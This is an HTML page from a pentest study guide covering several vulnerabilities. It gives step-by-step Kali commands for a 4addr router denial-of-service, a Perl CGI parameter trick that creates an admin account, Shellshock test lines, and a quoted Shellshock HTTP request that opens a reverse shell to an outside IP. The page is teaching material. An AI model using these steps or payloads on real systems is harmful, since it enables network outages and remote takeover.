@@ -1,0 +1,452 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>8.11. Vulnerabilites &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="8. Pentest Study" href="../pentest_study.html"/>
+        <link rel="next" title="8.12. WiFi Tutorial" href="wifi.html"/>
+        <link rel="prev" title="8.10. PHP &amp; MySQL Shortcomings" href="php.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="2factor.html">8.1. 2 Factor Authentication</a></li>
+<li class="toctree-l2"><a class="reference internal" href="email_security.html">8.2. Email Security</a></li>
+<li class="toctree-l2"><a class="reference internal" href="exfiltration.html">8.3. Exfiltration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="exiftool.html">8.4. <strong class="program">exiftool</strong></a></li>
+<li class="toctree-l2"><a class="reference internal" href="loadlibrary.html">8.5. loadlibrary</a></li>
+<li class="toctree-l2"><a class="reference internal" href="linux_exploitation_tricks.html">8.6. Linux Exploitation Tricks</a></li>
+<li class="toctree-l2"><a class="reference internal" href="llmnr.html">8.7. Windows broadcast name resolution</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ntlm.html">8.8. NTLM</a></li>
+<li class="toctree-l2"><a class="reference internal" href="passwords.html">8.9. Password Cracking Resources</a></li>
+<li class="toctree-l2"><a class="reference internal" href="php.html">8.10. PHP &amp; MySQL Shortcomings</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">8.11. Vulnerabilites</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#addr-router-dos">8.11.1. <code class="docutils literal"><span class="pre">4addr</span></code> router DOS</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#the-exploit-4addr">8.11.1.1. the exploit &amp; <code class="docutils literal"><span class="pre">4addr</span></code></a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploit-details">8.11.1.2. exploit details</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#badusb">8.11.2. BadUSB</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#heartbleed">8.11.3. Heartbleed</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#perl-web-vulnerability">8.11.4. Perl Web Vulnerability</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#shellshock">8.11.5. Shellshock</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#bash-example">8.11.5.1. <code class="docutils literal"><span class="pre">bash</span></code> Example</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#cgi-example">8.11.5.2. CGI Example</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#more-exploitation-vectors">8.11.5.3. More Exploitation Vectors</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#smack-freak">8.11.6. SMACK &amp; FREAK</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="wifi.html">8.12. WiFi Tutorial</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_study.html">8. Pentest Study</a> &raquo;</li>
+        
+      <li>8.11. Vulnerabilites</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/study/vulnerabilities.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="vulnerabilites">
+<h1>8.11. Vulnerabilites<a class="headerlink" href="#vulnerabilites" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="addr-router-dos">
+<span id="addrdos"></span><h2>8.11.1. <code class="docutils literal"><span class="pre">4addr</span></code> router DOS<a class="headerlink" href="#addr-router-dos" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="the-exploit-4addr">
+<h3>8.11.1.1. the exploit &amp; <code class="docutils literal"><span class="pre">4addr</span></code><a class="headerlink" href="#the-exploit-4addr" title="Permalink to this headline">¶</a></h3>
+<p>There is a vulnerability in some (home) routers that can take down the router’s wired and wireless networks just by attempting to connect to the wireless network with a wireless interface having the <code class="docutils literal"><span class="pre">4addr</span></code> option set. It is significant that any attacker can scan for wireless networks and attack the router just by trying to connect.</p>
+<p>From <a class="reference external" href="http://wireless.kernel.org/en/users/Documentation/iw#Using_4-address_for_AP_and_client_mode">Using 4-address for AP and client mode</a>:</p>
+<blockquote>
+<div>In some situations it might be useful to run a network with an Access Point and multiple clients, but with each client bridged to a network behind it. For this to work, both the client and the AP need to transmit 4-address frames, containing both source and destination MAC addresses. … 4-address mode is not compatible with other WDS implementations, ie, you’ll need all endpoints using this mode in order for WDS to work appropriately.</div></blockquote>
+<p>So instead of the normal 3 MAC addresses, 4 are transmitted. From <a class="reference external" href="http://en.wikipedia.org/wiki/Wireless_distribution_system">Wireless distribution system</a>:</p>
+<blockquote>
+<div>WDS may be incompatible between different products (even occasionally from the same vendor) since the IEEE 802.11-1999 standard does not define how to construct any such implementations or how stations interact to arrange for exchanging frames of this format. The IEEE 802.11-1999 standard merely defines the 4-address frame format that makes it possible.</div></blockquote>
+<p>Just what we need for an exploit.</p>
+</div>
+<div class="section" id="exploit-details">
+<h3>8.11.1.2. exploit details<a class="headerlink" href="#exploit-details" title="Permalink to this headline">¶</a></h3>
+<p>For this demo we used 3 devices: the target ROUTER providing a wired network and wireless network (SSID “WIFI” here); a Kali Linux HACKER laptop; and a wired local DESKTOP to demo the router failure.</p>
+<p>On HACKER, we insure network-manager is stopped and set the wlan0 interface <code class="docutils literal"><span class="pre">4addr</span></code> on:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">WLAN</span><span class="o">=</span>wlan0
+<span class="gp">hacker@kali:~$</span> sudo service network-manager stop
+<span class="gp">hacker@kali:~$</span> sudo iw dev <span class="nv">$WLAN</span> <span class="nb">set</span> 4addr on
+</pre></div>
+</div>
+<p>On DESKTOP we start a <code class="docutils literal"><span class="pre">ping</span></code> to show the ROUTER’s wired connectivity working:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">user@desktop:~$</span> ping <span class="m">192</span>.168.1.1
+<span class="go">PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.455 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.335 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=0.321 ms</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+<p>Now that the <code class="docutils literal"><span class="pre">ping</span></code> is running, begin the attack from HACKER by starting up network-manager and try to connect to SSID “WIFI”. You don’t even need to know the password - you just have to try to connect over a <code class="docutils literal"><span class="pre">4addr</span></code> wireless interface:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sudo service network-manager start
+<span class="gp">hacker@kali:~$ #</span> use the network-manager GUI to connect to SSID <span class="s2">&quot;WIFI&quot;</span>
+<span class="gp">hacker@kali:~$ #</span>   enter the wrong password to mimick attacking an unknown network
+</pre></div>
+</div>
+<p>On DESKTOP the <code class="docutils literal"><span class="pre">ping</span></code> will eventually show the network failure:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">64 bytes from 192.168.1.1: icmp_seq=52 ttl=64 time=0.339 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=53 ttl=64 time=0.334 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=54 ttl=64 time=0.406 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=55 ttl=64 time=0.374 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=56 ttl=64 time=0.367 ms</span>
+<span class="go">From 192.168.1.28 icmp_seq=100 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=101 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=102 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=103 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=104 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=105 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=106 Destination Host Unreachable</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+<p>Both ROUTER’s wired and wireless networks are now busted, requiring power cycling the ROUTER to fix. If we left the HACKER machine configuration the same, every recycle would lead to a busted network. To allow ROUTER’s network to recover, turn off network-manager and set <code class="docutils literal"><span class="pre">4addr</span></code> off:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">WLAN</span><span class="o">=</span>wlan0
+<span class="gp">hacker@kali:~$</span> sudo service network-manager stop
+<span class="gp">hacker@kali:~$</span> sudo iw dev <span class="nv">$WLAN</span> <span class="nb">set</span> 4addr off
+</pre></div>
+</div>
+<p>Now power cycle the ROUTER and watch the ping start working:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">From 192.168.1.28 icmp_seq=170 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=171 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=172 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=173 Destination Host Unreachable</span>
+<span class="go">From 192.168.1.28 icmp_seq=174 Destination Host Unreachable</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=175 ttl=64 time=0.456 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=176 ttl=64 time=0.503 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=177 ttl=64 time=0.419 ms</span>
+<span class="go">64 bytes from 192.168.1.1: icmp_seq=178 ttl=64 time=0.341 ms</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="badusb">
+<h2>8.11.2. BadUSB<a class="headerlink" href="#badusb" title="Permalink to this headline">¶</a></h2>
+<p>From <a class="reference external" href="http://en.wikipedia.org/wiki/Firmware#Security_risks">Firmware - Security risks</a>:</p>
+<blockquote>
+<div><p>Mark Shuttleworth, founder of the Ubuntu Linux distribution, has described proprietary firmware as a security risk, saying that “firmware on your device is the NSA’s best friend” and calling firmware “a trojan horse of monumental proportions”. He has pointed out that low-quality, closed source firmware is a major threat to system security: “Your biggest mistake is to assume that the NSA is the only institution abusing this position of trust – in fact, it’s reasonable to assume that all firmware is a cesspool of insecurity, courtesy of incompetence of the highest degree from manufacturers, and competence of the highest degree from a very wide range of such agencies”.</p>
+<p>A USB device firmware hack called BadUSB was presented at Black Hat USA 2014 conference, demonstrating how a USB flash drive microcontroller can be reprogrammed to spoof various other device types in order to take control of a computer, exfiltrate data, or spy on the user. Other security researchers have worked further on how to exploit the principles behind the BadUSB, releasing at the same time the source code of hacking tools that can be used modify the behavior of USB flash drives.</p>
+</div></blockquote>
+<p>From <a class="reference external" href="https://srlabs.de/badusb/">Turning USB peripherals into BadUSB</a>, that little USB device you’re plugging into your computer has a controller chip that can be reprogrammed to turn it into an evil BadUSB, like a keyboard, network card, or even boot a small virus. Currently there are no known effective defenses.</p>
+<p><a class="reference external" href="https://github.com/adamcaudill/Psychson">Phison 2251-03 (2303) Custom Firmware &amp; Existing Firmware Patches</a> github repository provides source code for a firmware attack against <a class="reference external" href="http://en.wikipedia.org/wiki/Phison">Phison</a> USB controllers.</p>
+<p>View the overview presentation <a class="reference external" href="https://srlabs.de/blog/wp-content/uploads/2014/07/SRLabs-BadUSB-BlackHat-v1.pdf">BadUSB - On accessories that turn evil</a>.</p>
+</div>
+<div class="section" id="heartbleed">
+<h2>8.11.3. Heartbleed<a class="headerlink" href="#heartbleed" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="http://heartbleed.com/">Heartbleed</a> (see <a class="reference external" href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160">CVE-2014-0160</a> and <a class="reference external" href="http://en.wikipedia.org/wiki/Heartbleed">Wikipedia Heartbleed</a>) is best explained via the simple cartoon <a class="reference external" href="http://xkcd.com/1354/">How the Heartbleed Bug Works</a>. Basically, you can request up to 64k memory dumped which can contain important data like certificates, user credentials, or sensitive data.</p>
+</div>
+<div class="section" id="perl-web-vulnerability">
+<h2>8.11.4. Perl Web Vulnerability<a class="headerlink" href="#perl-web-vulnerability" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="http://blog.gerv.net/2014/10/new-class-of-vulnerability-in-perl-web-applications/">New Class of Vulnerability in Perl Web Applications</a> describes exploitation of Perl’s dynamic nature: <code class="docutils literal"><span class="pre">$cgi-&gt;param()</span></code> call is context sensitive and can return a scalar or an array depeding on the context you call it. If you call it in an array context then it returns an array of values, but in a scalar context it returns a single value (maybe the first one if multiple values are present).</p>
+<p>Consider this Perl code (from the above link):</p>
+<div class="highlight-perl"><div class="highlight"><pre><span></span><span class="k">my</span> <span class="nv">$otheruser</span> <span class="o">=</span> <span class="nn">Bugzilla::User</span><span class="o">-&gt;</span><span class="n">create</span><span class="p">({</span>
+    <span class="n">login_name</span> <span class="o">=&gt;</span> <span class="nv">$login_name</span><span class="p">,</span>
+    <span class="n">realname</span>   <span class="o">=&gt;</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;realname&#39;</span><span class="p">),</span>
+    <span class="n">cryptpassword</span> <span class="o">=&gt;</span> <span class="nv">$password</span><span class="p">});</span>
+</pre></div>
+</div>
+<p>So then you provide multiple realname’s:</p>
+<div class="highlight-text"><div class="highlight"><pre><span></span>index.cgi?realname=JRandomUser&amp;realname=login_name&amp;realname=admin@mozilla.com
+</pre></div>
+</div>
+<p>Then the realname becomes <em>admin&#64;mozilla.com</em> and you you base admin permissions off having a realname ending in “&#64;mozilla.com” they’ve just created an admin user.</p>
+<p>The fix is to clearly state a value is a scalar:</p>
+<div class="highlight-perl"><div class="highlight"><pre><span></span><span class="k">my</span> <span class="nv">$otheruser</span> <span class="o">=</span> <span class="nn">Bugzilla::User</span><span class="o">-&gt;</span><span class="n">create</span><span class="p">({</span>
+    <span class="n">login_name</span> <span class="o">=&gt;</span> <span class="nv">$login_name</span><span class="p">,</span>
+    <span class="n">realname</span>   <span class="o">=&gt;</span> <span class="nb">scalar</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;realname&#39;</span><span class="p">),</span>
+    <span class="n">cryptpassword</span> <span class="o">=&gt;</span> <span class="nv">$password</span><span class="p">});</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="shellshock">
+<h2>8.11.5. Shellshock<a class="headerlink" href="#shellshock" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="http://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a> is “a family of security bugs” in <code class="docutils literal"><span class="pre">bash</span></code>. Also see <a class="reference external" href="http://www.zdnet.com/the-shellshock-faq-heres-what-you-need-to-know-7000034219/">Shellshock FAQ</a> and <a class="reference external" href="https://shellshocker.net/">What is #shellshock?</a>.</p>
+<div class="section" id="bash-example">
+<h3>8.11.5.1. <code class="docutils literal"><span class="pre">bash</span></code> Example<a class="headerlink" href="#bash-example" title="Permalink to this headline">¶</a></h3>
+<p>“The first bug causes Bash to unintentionally execute commands when the commands are concatenated to the end of function definitions stored in the values of environment variables.”</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># &quot;() { :;};&quot; is a function definition, &quot;echo vulnerable&quot; is a trailing command</span>
+env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s2">&quot;echo this is a test&quot;</span>
+</pre></div>
+</div>
+<p>However, more bugs were discovered, including this one where a file <em>echo</em> containing the result of the <code class="docutils literal"><span class="pre">date</span></code> command is created in the working directory.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nv">X</span><span class="o">=</span><span class="s1">&#39;() { (a)=&gt;\&#39;</span> bash -c <span class="s2">&quot;echo date&quot;</span>
+<span class="go">bash: X: line 1: syntax error near unexpected token `=&#39;</span>
+<span class="go">bash: X: line 1: `&#39;</span>
+<span class="go">bash: error importing function definition for `X&#39;</span>
+<span class="gp">$</span> cat <span class="nb">echo</span>
+<span class="go">Fri Sep 26 01:37:16 UTC 2014</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="cgi-example">
+<h3>8.11.5.2. CGI Example<a class="headerlink" href="#cgi-example" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="http://www.futuresouth.us/wordpress/?p=5">Yahoo! Shellshocked Like Ninja Turtles!</a> shows how Yahoo might have been hacked. It shows CGI can use <code class="docutils literal"><span class="pre">bash</span></code> and can be found with a Google searchs like ‘inurl:cgi-bin filetype:sh’, ‘inurl:cgi-bin filetype:pl’, and ‘inurl:cgi-bin filetype:cgi’. A http request of</p>
+<div class="highlight-text"><div class="highlight"><pre><span></span>GET %s HTTP/1.0\r\n
+User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/199.175.52.92/2221 0&gt;&amp;1\r\n
+Cookie: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/199.175.52.92/2221 0&gt;&amp;1\r\n
+Host: %s\r\n
+Referer: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/199.175.52.92/2221 0&gt;&amp;1\r\n
+\r\n
+</pre></div>
+</div>
+<p>They User-Agent, Cookie, and Referer fields execute the command <code class="docutils literal"><span class="pre">/bin/bash</span> <span class="pre">-i</span> <span class="pre">&gt;&amp;</span> <span class="pre">/dev/tcp/199.175.52.92/2221</span> <span class="pre">0&gt;&amp;1\r\n</span></code>, which opens an interactive shell, redirects stdout, stderr, and stdin over tcp to host 199.175.52.92 on port 2221. Sitting on port 2221 on the remote host can be a program that issues shell commands.</p>
+</div>
+<div class="section" id="more-exploitation-vectors">
+<h3>8.11.5.3. More Exploitation Vectors<a class="headerlink" href="#more-exploitation-vectors" title="Permalink to this headline">¶</a></h3>
+<p>There are more <a class="reference external" href="http://en.wikipedia.org/wiki/Shellshock_(software_bug)#Specific_exploitation_vectors">specific exploitation vectors</a>.</p>
+</div>
+</div>
+<div class="section" id="smack-freak">
+<h2>8.11.6. SMACK &amp; FREAK<a class="headerlink" href="#smack-freak" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="https://www.smacktls.com/">SMACK: State Machine AttaCKs</a> assumes:</p>
+<blockquote>
+<div><p>a network adversary (i.e. a man-in-the-middle) to tamper with TLS handshake messages. The typical scenario to mount such attacks is by tampering with the Domain Name System (DNS), for example via DNS rebinding or domain name seizure.</p>
+<p>We find that several TLS implementations incorrectly allow some messages to be skipped even though they are required for the selected cipher suite. The explanation for these attacks is very simple: libraries attempt to reuse as much code as possible between the different cipher suites. However, the consequences of these vulnerabilities can be severe.</p>
+</div></blockquote>
+<p>In fact:</p>
+<blockquote>
+<div><p><em>JSSE clients allow the peer to skip all messages related to key exchange and authentication</em>. In particular, a network attacker can send the certificate of any arbitrary website, and skip the rest of the protocol messages. A vulnerable JSSE client is then willing to accept the certificate and start exchanging unencrypted application data. In other words, the JSSE implementation of TLS has been providing virtually no security guarantee (no authentication, no integrity, no confidentiality) for the past several years.</p>
+<p>Our attacks show that a malicious server can simply skip TLS altogether: it can pretend to be any server and exchange plaintext data with the client. Still Java clients are used routinely to access sensitive HTTPS APIs such as Google, Paypal, and Amazon Web Services through popular Java SDKs.</p>
+</div></blockquote>
+<p>FREAK exploits a SMACK-type state machine vulnerability wherby a man-in-the-middle can downgrade the ciphersuite selected to an old, weak RSA export cipher:</p>
+<blockquote>
+<div><p>Thus, if a server is willing to negotiate an export ciphersuite, a man-in-the-middle may trick a browser (which normally doesn’t allow it) to use a weak export key. By design, export RSA moduli must be less than 512 bits long; hence, they can be factored in less than 12 hours for $100 on Amazon EC2.</p>
+<p>Ironically, many US government agencies (including the NSA and FBI), as well as a number of popular websites (IBM, or Symantec) enable export ciphersuites on their server - by factoring their 512-bit RSA modulus, an attacker can impersonate them to vulnerable clients.</p>
+</div></blockquote>
+<p>For an excellent overview of the exploit see <a class="reference external" href="http://blog.cryptographyengineering.com/2015/03/attack-of-week-freak-or-factoring-nsa.html">Attack of the week: FREAK (or ‘factoring the NSA for fun and profit’)</a>. Especially interesting is that:</p>
+<blockquote>
+<div><p>Apache mod_ssl by default will generate a single export-grade RSA key when the server starts up, and will simply re-use that key for the lifetime of that server.</p>
+<p>What this means is that you can obtain that RSA key once, factor it, and break every session you can get your ‘man in the middle’ mitts on until the server goes down. And that’s the ballgame.</p>
+</div></blockquote>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="wifi.html" class="btn btn-neutral float-right" title="8.12. WiFi Tutorial" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="php.html" class="btn btn-neutral" title="8.10. PHP &amp; MySQL Shortcomings" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
